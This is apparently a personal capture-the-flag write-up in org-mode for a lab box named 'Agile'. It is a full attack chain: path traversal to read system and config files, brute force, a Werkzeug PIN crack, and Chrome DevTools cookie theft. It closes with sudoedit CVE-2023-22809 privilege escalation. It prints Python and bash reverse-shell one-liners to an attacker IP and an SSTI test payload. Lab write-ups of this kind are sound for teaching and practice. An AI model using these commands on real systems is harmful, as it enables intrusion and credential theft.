@@ -1,0 +1,499 @@
+==
+tags: #linux #sudoedit #werkzeug #chrome-remote-debugging
+=
+
+* nmap
+  #+begin_src bat
+  sudo nmap -sV -sC -oA nmap/agile.basic 10.129.228.212
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
+| ssh-hostkey: 
+|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
+|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://superpass.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+  #+end_src
+** full scan
+   #+begin_src bat
+   sudo nmap  -p- -A -T4 -oA nmap/agile.full 10.129.228.212
+   #+end_src
+* port 80                                                            :ATTACH:
+  :PROPERTIES:
+  :ID:       a455b3c4-9ff1-4f60-83f8-89d82bf6190d
+  :END:
+  visiting =superpass.htb=, we find it's a password vault application; trying
+  =admin:admin= on the login page, we find debug info is printed:
+  [[attachment:2026-07-21_10-45.png]]
+
+  so we can see the application is using some python framework and mysql;
+  following the trace further, we can see the framework is infact =flask=.
+  #+begin_src sql
+  sqlalchemy.exc.OperationalError: (pymysql.err.OperationalError) (2013, 'Lost connection to MySQL server during query')
+[SQL: SELECT users.id AS users_id, users.username AS users_username, users.hashed_password AS users_hashed_password 
+FROM users 
+WHERE users.username = %(username_1)s 
+ LIMIT %(param_1)s]
+[parameters: {'username_1': 'admin', 'param_1': 1}]
+  #+end_src
+* create an account and log in                                       :ATTACH:
+  :PROPERTIES:
+  :ID:       67fdecdc-1ffe-4f56-8ec4-6ffa902b0750
+  :END:
+  after login, we can see the application lets us store passwords for sites:
+  [[attachment:2026-07-21_23-11.png]]
+
+  the export function (which calls the =/export= endpoint) downloads the whole
+  table as a csv file named =supperpass_export.csv=.
+* fuzz
+** vhost
+   #+begin_src bat
+   gobuster vhost -u http://10.129.37.37 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
+   #+end_src
+*** wfuzz
+    #+begin_src 
+    wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 10.129.37.37 -H "Host: FUZZ.superpass.htb" --hc 301
+    #+end_src
+** page fuzzing
+   #+begin_src bat
+   $ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://superpass.htb/FUZZ
+   #+end_src
+   reveals the additional =/download= endpoint
+* download endpoint
+  the debug logs reveal this function:
+  #+begin_src python
+  @blueprint.get('/download')
+  @login_required
+  def download():
+      r = flask.request
+      fn = r.args.get('fn')
+      with open(f'/tmp/{fn}', 'rb') as f:
+          data = f.read()
+      resp = flask.make_response(data)
+      resp.headers['Content-Disposition'] = 'attachment; filename=superpass_export.csv'
+      resp.mimetype = 'text/csv'
+
+      return resp
+  #+end_src
+  this means we can access a file using query parameters; so try:
+  #+begin_src bash
+  /download?fn=../../etc/passwd
+  #+end_src
+  and we get the =passwd= file downloaded as =supperpass_export.csv=;
+  #+begin_src bat
+  $ cat passwd | grep sh
+
+root:x:0:0:root:/root:/bin/bash
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+corum:x:1000:1000:corum:/home/corum:/bin/bash
+runner:x:1001:1001::/app/app-testing/:/bin/sh
+edwards:x:1002:1002::/home/edwards:/bin/bash
+dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
+  #+end_src
+* exfiltrate data
+  from the error trace, we see the location of the app is =/app/app/superpass=;
+  we also get the filename =/app/app/superpass/app.py=; which lets us know
+  there's a config file where db connection string is stored:
+  #+begin_src python
+  def setup_db():                                            
+    db_session.global_init(app.config['SQL_URI'])
+
+  <SNIP>
+  def load_config():
+    config_path = os.getenv("CONFIG_PATH")
+    with open(config_path, 'r') as f:
+        for k, v in json.load(f).items():
+            app.config[k] = v
+  #+end_src
+  with this we know the =CONFIG_PATH= is an environment variable; let's get it
+  from =/proc/self/environ=
+  #+begin_src bash
+  http://superpass.htb/download?fn=../../../proc/self/environ
+  #+end_src
+  in this file, we can see the variable:
+  #+begin_src bash
+  CONFIG_PATH=/app/config_prod.json
+  #+end_src
+  this file contains just the mysql connection string:
+  #+begin_src js
+  {"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
+  #+end_src
+** vault_views.py
+   from =app.py=, we're aware of the existence of 3 views files
+** try and exfiltrate ssh keys
+   run into permission errors for all users
+   #+begin_src bash
+   PermissionError: [Errno 13] Permission denied: '/tmp/../../..//home/dev_admin/.ssh/id_rsa'
+   #+end_src
+* login bruteforce
+  trying out the various usernames on the register form, we see that the 
+  =corum= user exists (unlike the rest); so it's worth trying to bruteforce
+  #+begin_src bat
+  $ hydra -V -l corum -P /usr/share/wordlists/rockyou.txt superpass.htb http-post-form "/account/login:username=^USER^&password=^PASS^:H=Cookie\: session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIlBsZWFzZSBsb2cgaW4gdG8gYWNjZXNzIHRoaXMgcGFnZS4iXX1dLCJfZnJlc2giOmZhbHNlfQ.amHg2A.mtlDxA-k1-SKsRxlNoxluPdQRLY; remember_token=9|61ae6d7c279f4f73fcde540d80d9d15cb5c09d434df4cacab74c4e995d2fd96bd6b449f1da160ac7a2a91b539f312371fc5e2ec9d7bfdd512b61a10fd9ad352c:F=Login failed"
+  #+end_src
+  *it is important to put the failure condition after all the cookies.*
+* guided mode                                                        :ATTACH:
+  :PROPERTIES:
+  :ID:       fcde48da-ad86-4961-a081-61f58d136848
+  :END:
+  #+begin_src 
+  It is well documented how to crack the Werkzeug (or Flake debug) pin. We'll
+  need to collect data from the host. What is the username of the running
+  application?
+  #+end_src
+  ok turns out we need to exploit the debug console which is locked by a pin:
+  [[attachment:2026-07-23_19-32.png]]
+* werkzeug debugger exploit
+  [[https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html][this hacktricks article]] lists the exact steps to reverse engineer the pin;
+  however, there are a few nuances.
+  we're able to get the flask =app.py= path from the debugger output
+  #+begin_src
+  /app/venv/lib/python3.10/site-packages/flask/app.py
+  #+end_src
+  i modified the =get_machine_id()= function:
+  #+begin_src python
+  def _generate():
+    linux = b""
+
+    # machine-id is stable across boots, boot_id is not.
+    filename = "machine_id"
+    with open(filename, "rb") as f:
+        value = f.readline().strip()
+        linux += value
+
+    # Containers share the same machine id, add some cgroup
+    # information. This is used outside containers too but should be
+    # relatively stable across boots.
+    try:
+        with open("proc_self_cgroup", "rb") as f:
+            linux += f.readline().strip().rpartition(b"/")[2]
+    except OSError:
+        pass
+
+    if linux:
+        return linux
+
+print(_generate())
+  #+end_src
+  on running it, we get:
+  #+begin_src bash
+  $ python get_machine_id.py 
+
+b'ed5b159560f54721827644bc9b220d00superpass.service'
+  #+end_src
+  now we need to plug this into the exploit script - but it will fail because
+  it assumes the value of the code below is =Flask=; however, in this case, it
+  turns out it's =wsgi_app=;
+  #+begin_src python
+  getattr(app, '__name__', getattr(app.__class__, '__name__'))# not Flask here
+  #+end_src
+  i had to look up the Hint at this point; and it pointed to [[https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/][this article]]
+  which goes into a lot of detail about how this works.
+  running the exploit generates the pin and we have access to the interpreter.
+* python revshell
+  #+begin_src python
+  socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.179",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
+  #+end_src
+* mysql
+  we get the following creds from the password table
+** creds
+   #+begin_src 
+   corum: 5db7caa1d13cc37c9fc2
+   #+end_src
+* user flag
+  #+begin_src bat
+  corum@agile:~$ cat user.txt 
+
+de0e35d0f5784ea505c17260bc998636
+  #+end_src
+* sudo rights
+  #+begin_src bat
+  corum@agile:~$ sudo -l
+
+Sorry, user corum may not run sudo on agile.
+  #+end_src
+* linpeas
+  lists a chrome headless process with an active remote debugger port
+  #+begin_src
+  --remote-debugging-port=41829
+  #+end_src
+  it's possible to connect to this via a websocket
+  #+begin_src bash
+  corum@agile:~$ curl http://localhost:41829/json/version
+
+{
+   "Browser": "HeadlessChrome/108.0.5359.94",
+   "Protocol-Version": "1.3",
+   "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/108.0.5359.94 Safari/537.36",
+   "V8-Version": "10.8.168.21",
+   "WebKit-Version": "537.36 (@713576b895246504ccc6b92c2fb8ce2d60194074)",
+   "webSocketDebuggerUrl": "ws://localhost:41829/devtools/browser/dd42b987-b8dd-483b-b9d7-e48e59dddd09"
+}
+
+  corum@agile:~$ curl http://localhost:41829/json/list
+
+[ {
+   "description": "",
+   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:41829/devtools/page/CFA6041314EFA8E242E99B69B8FA5E",
+   "id": "61CFA6041314EFA8E242E99B69B8FA5E",
+   "title": "SuperPassword",
+   "type": "page",
+   "url": "http://test.superpass.htb/",
+   "webSocketDebuggerUrl": "ws://localhost:41829/devtools/page/61CFA6041314EFA8E242E99B69B8FA5E"
+} ]
+  #+end_src
+* get cookies
+  #+begin_src python
+  import json
+  import socket
+  
+  from wsproto import WSConnection
+  from wsproto.connection import ConnectionType
+  from wsproto.events import Request, AcceptConnection, TextMessage
+  
+  HOST = "localhost"
+  PORT = 41829
+  PATH = "/devtools/page/61CFA6041314EFA8E242E99B69B8FA5E"
+  
+  sock = socket.create_connection((HOST, PORT))
+  
+  ws = WSConnection(ConnectionType.CLIENT)
+  
+  # Start handshake
+  sock.sendall(
+      ws.send(
+          Request(
+              host=f"{HOST}:{PORT}",
+              target=PATH,
+          )
+      )
+  )
+  
+  # Wait for handshake completion
+  while True:
+      data = sock.recv(4096)
+      ws.receive_data(data)
+  
+      for event in ws.events():
+          print(event)
+          if isinstance(event, AcceptConnection):
+              print("Connected")
+              break
+      else:
+          continue
+      break
+  
+  # Send a CDP command
+  sock.sendall(
+      ws.send(
+          TextMessage(
+              json.dumps({
+                  "id": 1,
+                  "method": "Network.getAllCookies"
+              })
+          )
+      )
+  )
+  
+  # Read responses
+  while True:
+      data = sock.recv(4096)
+      ws.receive_data(data)
+  
+      for event in ws.events():
+          print(event)
+          if isinstance(event, TextMessage):
+              print(event.data)
+  #+end_src
+  run:
+  #+begin_src bash
+  (venv) corum@agile:~$ python get_cookies.py 
+
+AcceptConnection(subprotocol=None, extensions=[], extra_headers=[])
+Connected
+TextMessage(data='{"id":1,"result":{"cookies":[{"name":"remember_token","value":"1|24ea6bfa8c5ed75e76a36b27765b87859ba06dc58f78e88709e8cd8a410c5e95780158fa80fb0d9635810dc6b3f9c5284beba14c059a246d789aecbd622a8960","domain":"test.superpass.htb","path":"/","expires":1816692190.648579,"size":144,"httpOnly":true,"secure":false,"session":false,"priority":"Medium","sameParty":false,"sourceScheme":"NonSecure","sourcePort":80},{"name":"session","value":".eJwlzjkOwjAQAMC_uKbYy2snn0HeS9AmpEL8HSTmBfNu9zryfLT9dVx5a_dntL1x6FxEI2cX1lATrF6KSgYjJDcv24LSRQu2bqQwPXGymkPMEIMAjpDRO6DjcqqZqoOjWBxRQYEsmXHgxCUhsNzTRhh2kvaLXGce_w22zxef3y7n.amdSXg.u3DpP40eJsmRTRP_ErxBNa4odY0","domain":"test.superpass.htb","path":"/","expires":-1,"size":215,"httpOnly":true,"secure":false,"session":true,"priority":"Medium","sameParty":false,"sourceScheme":"NonSecure","sourcePort":80}]}}', frame_finished=True, message_finished=True)
+  #+end_src
+* access vault with cookies
+  #+begin_src bash
+  (venv) corum@agile:~$ curl 'http://test.superpass.htb/vault' -H 'Cookie: remember_token=1|24ea6bfa8c5ed75e76a36b27765b87859ba06dc58f78e88709e8cd8a410c5e95780158fa80fb0d9635810dc6b3f9c5284beba14c059a246d789aecbd622a8960; session=.eJwlzjk
+OwjAQAMC_uKbYy2snn0HeS9AmpEL8HSTmBfNu9zryfLT9dVx5a_dntL1x6FxEI2cX1lATrF6KSgYjJDcv24LSRQu2bqQwPXGymkPMEIMAjpDRO6DjcqqZqoOjWBxRQYEsmXHgxCUhsNzTRhh2kvaLXGce_w22zxef3y7n.amdSXg.u3DpP40eJsmRTRP_ErxBNa4odY0'   
+  
+   ...<SNIP>
+    <td>agile</td>
+    <td>edwards</td>
+    <td>d07867c6267dcb5df0af</td>
+  #+end_src
+  great, now we have have =edwards= user's password and we're able to switch to
+  the user via =su - edwards=
+* edwards creds
+  #+begin_src 
+  edwards: d07867c6267dcb5df0af
+  #+end_src
+* sudo rights
+  #+begin_src bat
+  edwards@agile:~$ sudo -l
+
+Matching Defaults entries for edwards on agile:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User edwards may run the following commands on agile:
+    (dev_admin : dev_admin) sudoedit /app/config_test.json
+    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
+  #+end_src
+** contents of the files
+   access the files like so: =sudoedit -u dev_admin <filename>=
+   =/app/app-testing/tests/functional/creds.txt= contains
+    #+begin_src 
+edwards:1d7ffjwrx#$d6qn!9nndqgde4
+    #+end_src
+    =/app/config_test.json= contains
+    #+begin_src 
+"mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"
+    #+end_src
+* database contents
+  #+begin_src sql
+  mysql> select * from passwords;
+
++----+--+---------+------------+----------------------+---------+
+| id |  | url     | username   | password             | user_id |
++----+--+---------+------------+----------------------+---------+
+|  1 |  | agile   | edwards    | d07867c6267dcb5df0af |       1 |
+|  2 |  | twitter | dedwards__ | 7dbfe676b6b564ce5718 |       1 |
++----+--+---------+------------+----------------------+---------+
+
+2 rows in set (0.00 sec)
+
+  mysql> select * from users;
++----+----------+--------------------------------------------------------------------------------------------------------------------------+
+| id | username | hashed_password|
++----+----------+--------------------------------------------------------------------------------------------------------------------------+
+|  1 | edwards  | $6$rounds=200000$tXCy.rfqmsaJqOoA$Pu1DcBDRZt4a6OGO35cdU4fd7mlhPthDpMcQBOclCuhW1hnAIk1aj/itcJIQ8lIhRHxSZNe4I.5aqaTtkWtnr0 |
++----+----------+--------------------------------------------------------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+  #+end_src
+  NOTE: the =hashed_password= value is not the same as the hashed value of the
+  known password for =edwards=:
+  #+begin_src python
+  >>> hasher.verify('d07867c6267dcb5df0af', '$6$rounds=200000$tXCy.rfqmsaJqOoA$Pu1DcBDRZt4a6OGO35cdU4fd7mlhPthDpMcQBOclCuhW1hnAIk1aj/itcJIQ8lIhRHxSZNe4I.5aqaTtkWtnr0')
+
+False
+  #+end_src
+  turns out it's the hashed value of the creds from the text file:
+  #+begin_src python
+  >>> hasher.verify('1d7ffjwrx#$d6qn!9nndqgde4', '$6$rounds=200000$tXCy.rfqmsaJqOoA$Pu1DcBDRZt4a6OGO35cdU4fd7mlhPthDpMcQBOclCuhW1hnAIk1aj/itcJIQ8lIhRHxSZNe4I.5aqaTtkWtnr0')
+
+True
+  #+end_src
+  running =ps aux= reveals this line:
+  #+begin_src bat
+  runner     27521  0.2  0.8  37892 31968 ?        S    22:30   0:00 /app/venv/bin/python3 /app/venv/bin/pytest -x 
+  #+end_src
+  this doesn't always show up so it must be scheduled to run at various times.
+* how sudoedit works
+  from [[https://www.sentinelone.com/vulnerability-database/cve-2023-22809/][sentinelone]]
+  #+begin_src 
+  The sudoedit feature in Sudo is designed to allow users to safely edit files
+  with elevated privileges without granting full shell access. When sudoedit
+  is invoked, it copies the target file to a temporary location, allows the
+  user to edit it with their preferred editor (determined by environment
+  variables), and then copies the modified file back to the original location.
+  #+end_src
+* CVE-2023-22809
+  #+begin_src 
+  In Sudo before 1.9.12p2, the sudoedit (aka -e) feature mishandles extra
+  arguments passed in the user-provided environment variables (SUDO_EDITOR,
+  VISUAL, and EDITOR), allowing a local attacker to append arbitrary entries
+  to the list of files to process. This can lead to privilege
+  escalation. Affected versions are 1.8.0 through 1.9.12.p1. The problem
+  exists because a user-specified editor may contain a "--" argument that
+  defeats a protection mechanism, e.g., an EDITOR='vim -- /path/to/extra/file'
+  value.
+  #+end_src
+  so this works; we can do:
+  #+begin_src bash
+  $ VISUAL='vim -- /app/app-testing/tests/functional/test_site_interactively.py' sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt 
+  #+end_src
+  the idea was to insert a reverse shell inside the test script; however, that
+  file is owned by =runner= and we don't have write permissions.
+** check for files where user dev_admin has write permissions
+   #+begin_src bat
+   $ find / -type f -user dev_admin -perm -u=w 2>/dev/null
+
+/app/app-testing/tests/functional/creds.txt
+   #+end_src
+** check for files where group dev_admin has write permissions
+   #+begin_src bat
+   $ find / -type f -group dev_admin -perm -u=w 2>/dev/null
+
+/app/venv/bin/activate
+/app/venv/bin/Activate.ps1
+/app/venv/bin/activate.fish
+/app/venv/bin/activate.csh
+   #+end_src
+   ok, so now let's insert a reverse shell in =activate= and activate the venv
+* bash revshell
+  #+begin_src bash
+  bash -i >& /dev/tcp/10.10.16.179/4444 0>&1
+  #+end_src
+* root flag
+  #+begin_src bat
+   nc -lvnp 4444
+
+listening on [any] 4444 ...
+connect to [10.10.16.179] from (UNKNOWN) [10.129.228.212] 54786
+bash: cannot set terminal process group (50791): Inappropriate ioctl for device
+bash: no job control in this shell
+
+   root@agile:~# cat root.txt
+
+5a19f8e8c4234f54ebe27a40bdc759f3
+  #+end_src
+* ippsec
+** SSTI payload
+   tests for an [[https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti][SSTI]] vuln and uses the below payload from the link which
+   should work on most languages
+   #+begin_src 
+  ${{<%[%'"}}%\.
+   #+end_src
+** the download endpoint
+   uses the captured request in burp for the =/export= endpoint to find the =/download= endpoint.
+** check process with ps -ef --forest
+   =ps -ef= is better for diagnosing process hierarchy; can be piped to less,
+   although it doesn't exist on this box. =--forest= shows parent/child hierarchy
+   #+begin_src 
+   ps -ef --forest | less
+   #+end_src
+   once the application running on port 5555 is discovered, just greps =/etc=
+   for the port and discovers the =nginx= file for the test url.
+** test_and_update.sh
+   we skipped over this file entirely but this is where the tests and
+   deployment are configured.
+** local port forwarding                                             :ATTACH:
+   :PROPERTIES:
+   :ID:       9e20421b-b291-4891-a5de-1c28c57f2295
+   :END:
+   forwards the remote debugging port to the attack host
+   port forward SSH from the attack host:
+   #+begin_src bat
+   ssh -L 41829:localhost:41829 corum@superpass.htb
+   #+end_src
+   open chromium, go to =chrome://inspect=
+   [[attachment:2026-07-29_18-11.png]]
+
+   click =Configure= and add the port:
+   [[attachment:2026-07-29_18-11_1.png]]
+
+   a new entry pops up in the =Remote Target= section:
+   [[attachment:2026-07-29_18-12.png]]
+   
+   after clicking =inspect=, a new window opens up:
+   [[attachment:2026-07-29_18-16.png]]
+
+   after clicking =Vault=, we can see the passwords:
+   [[attachment:2026-07-29_18-17.png]] 
+** the final reverse shell
+   we get the root shell not by running =source /app/venv/activate= but because
+   it's scheduled to run automatically every minute as root; when we do the
+   =source= command, we get a shell as =edwards=
